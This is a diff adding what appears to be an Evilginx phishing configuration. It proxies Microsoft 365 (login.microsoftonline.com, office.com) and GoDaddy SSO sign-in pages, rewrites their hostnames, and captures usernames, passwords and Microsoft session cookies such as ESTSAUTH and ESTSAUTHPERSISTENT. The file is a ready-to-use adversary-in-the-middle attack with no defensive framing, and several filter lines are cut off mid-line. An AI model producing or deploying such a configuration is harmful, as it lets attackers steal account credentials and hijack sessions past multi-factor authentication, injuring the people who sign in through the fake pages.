@@ -1,0 +1,37 @@
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false}
+  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: false, is_landing:false}
+  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: false, is_landing:false}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', m>
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text>
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', >
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application>
+  - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: >
+  - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html'>
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'json'
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+force_post:
